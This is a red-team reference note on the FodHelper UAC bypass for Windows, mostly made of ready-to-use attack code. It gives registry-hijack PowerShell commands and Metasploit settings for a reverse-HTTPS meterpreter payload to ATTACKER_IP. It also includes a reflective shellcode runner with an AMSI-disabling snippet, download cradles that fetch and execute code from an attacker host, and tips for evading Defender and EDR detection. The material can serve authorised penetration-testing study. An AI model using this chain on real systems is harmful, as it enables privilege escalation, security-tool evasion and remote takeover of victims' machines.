---
title: FodHelper UAC Bypass
draft: false
tags:
  - red-teaming
  - windows
  - uac-bypass
  - privilege-escalation
  - fodhelper
---
 
Execute PowerShell in a new process and evade AMSI.

> [!Requirements]
> Use one of the shellcode runners to obtain a shell on the target windows machine.

The Fodhelper binary runs as _high integrity_, and it interacts with the current user's registry, which we are allowed to modify.

Fodhelper tries to locate the following registry key, which does not exist by default in Windows 10:
```
HKCU:\Software\Classes\ms-settings\shell\open\command
```

If we create the registry key and add the _DelegateExecute_ value, Fodhelper will search for the default value _(Default)_ and use the content of the value to create a new process. If our exploit creates the registry path and sets the _(Default)_ value to an executable (like **powershell.exe**), it will be spawned as a high integrity process when Fodhelper is started.

**Manual Exploit**

```powershell
# Creates the registry path + sets the value of the default key to "powershell.exe"
PS C:\> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force

# Create DelegateExecute value
PS C:\> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

# start fodhelper.exe
PS C:\> C:\Windows\System32\fodhelper.exe
```

**Automatic Exploit**

Metasploit:
```bash
msf> use exploit/windows/local/bypassuac_fodhelper
msf> show targets
msf> set target 1 # x64; 0 for x86
msf> set session SESSION_ID
msf> set payload windows/x64/meterpreter/reverse_https
msf> set lhost ATTACKER_IP
msf> set lport 444
msf> exploit
```

This module triggers AMSI, so we have to manually place in the registry value the AMSI bypass + the shellcode runner.

> [!Note]
> The registry key can contain max 255 characters, while the value 16383 characters.

As our shellcode runner we'll use a download cradle to minimize the size. We are going to get the run.ps1 script on our attack machine and add one of the AMSI bypasses:
```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

# AMSI Bypass
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Shellcode Runner
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

If we modify the registry again with a download cradle, Windows Defender will detect the unencrypted and unencoded second stage payload:
```powershell
PS C:\> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/run.txt') | IEX" -Force

PS C:\> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

PS C:\> C:\Windows\System32\fodhelper.exe
```

Solution: enabling second stage encoder with metasploit:
```bash
msf> use exploit/windows/local/bypassuac_fodhelper
msf> show targets
msf> set target 1 # x64; 0 for x86
msf> set session SESSION_ID
msf> set payload windows/x64/meterpreter/reverse_https
msf> set lhost ATTACKER_IP
msf> set lport 444
msf> set EnableStageEncoding true
msf> set StageEncoder x64/zutto_dekiru # or x64/xor_dynamic in case of fail
msf> exploit
```

**C# Assembly Download + Load to Evade AMSI**

Instead of putting the reflective shellcode runner in `run.ps1` (which is scanned by AMSI when `IEX` executes it), compile a C# shellcode runner as a DLL and load it via `[Reflection.Assembly]::Load()`.

The `run.ps1` script becomes:

```powershell
# run.ps1 — hosted on ATTACKER_IP Apache
# 1. AMSI bypass (amsiContext zeroing via reflection)
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# 2. Download compiled C# runner DLL and load in-memory (not written to disk)
$bytes=(New-Object System.Net.WebClient).DownloadData('http://ATTACKER_IP/runner.dll')
[Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)
```

The C# runner DLL (Visual Studio Class Library project):
```csharp
using System;
using System.Runtime.InteropServices;

namespace Runner
{
    public class Program
    {
        // VirtualAlloc, CreateThread, WaitForSingleObject P/Invoke declarations
        // ... (same as standard C# shellcode runner)
        
        public static void Main(string[] args)
        {
            byte[] buf = new byte[] { /* AES/XOR-encrypted shellcode */ };
            // decrypt + allocate + execute
        }
    }
}
```

> [!Note]
> The C# DLL is never written to disk — it lives in memory as a byte array. AMSI is bypassed before `Assembly::Load()` is called, so the DLL bytes are not scanned. The DLL itself must still be AV-clean (apply [[Signature Based Detection]] techniques).

> [!Warning]
> OPSEC: The registry key `HKCU:\Software\Classes\ms-settings\shell\open\command` is a well-known UAC bypass IoC. EDR products and SIEMs alert on writes to this key. Clean up after execution:
> ```powershell
> Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
> ```



---
# Related Notes

- [[Antimalware Scan Interface (AMSI)]] — AMSI architecture
- [[Bypassing AMSI With Reflection in PowerShell]] — the amsiContext bypass used in run.ps1
- [[Wrecking AMSI in PowerShell]] — binary-patch alternative
- [[Reflective PowerShell]] — in-memory shellcode runner technique
- [[Process Injection and Migration]] — post-UAC privilege escalation options
